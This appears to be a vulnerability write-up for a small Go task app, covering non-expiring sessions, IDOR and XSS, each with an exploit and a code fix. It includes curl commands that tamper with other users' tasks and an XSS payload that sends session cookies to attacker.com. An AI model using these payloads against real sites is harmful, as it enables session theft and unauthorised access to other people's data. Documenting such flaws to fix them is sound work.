# security vulnerabilities


## 1. **no session expiration**


**vulnerability:**
sessions never expire. A stolen or compromised session token remains valid indefinitely.

**how to Exploit:**
1. steal a session cookie (via XSS, network sniffing, or compromised storage)
2. attacker has unlimited time to exploit stolen credentials

**impact:** privilege escalation

**fix:** add expiration timestamps:

```go
// previously

// nothing...
```

```go
// after
type SessionData struct {
    UserID    int
    ExpiresAt time.Time
}
var Sessions = map[string]SessionData{}

...

sessionData, exists := services.Sessions[session.Value]
if !exists || time.Now().After(sessionData.ExpiresAt) {
    http.Redirect(w, r, "/login/", http.StatusFound)
    return
}
```

---

## 2. insecure direct object reference (IDOR)

task endpoints do not verify ownership. any authenticated user can read, modify, or delete any other user's tasks by guessing or enumerating IDs.

**exploit:**
```bash
# read all users' tasks
curl -c cookies.txt -b cookies.txt -X POST http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"cat\",\"password\":\"meow\"}" && curl -b cookies.txt http://localhost:8080/tasks

# modify another user's task (id=2, owned by user 2)
curl -b cookies.txt -X PUT http://localhost:8080/tasks/2 \
  -H "Content-Type: application/json" \
  -d '{"title":"hacked","completed":false}'

# delete another user's task
curl -b cookies.txt -X DELETE http://localhost:8080/tasks/2

# spoof owner_id on creation
curl -b cookies.txt -X POST http://localhost:8080/tasks \
  -H "Content-Type: application/json" \
  -d '{"title":"fake","owner_id":2}'
```

**impact:** full read/write/delete access to any user's data.

**fix:**
```go
// reject if caller doesn't own the task
if task.OwnerID != callerID {
    http.Error(w, "forbidden", http.StatusForbidden)
    return
}

// always assign owner from session, never from request body
newTask.OwnerID = callerID
```

## 3. cross-site scripting (XSS)

task titles are rendered via `innerHTML`, treating user input as raw HTML. any script embedded in a title executes in the victim's browser.

**exploit:**
```
# enter this as a task title
<img src=x onerror="alert('XSS!')">

# realistic payload — steals session cookie
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

**impact:** session hijacking, credential theft, arbitrary JS execution.

**fix:**
```js
// before (vulnerable)
createTaskContent.innerHTML = task.title;

// after (safe)
createTaskContent.textContent = task.title;
```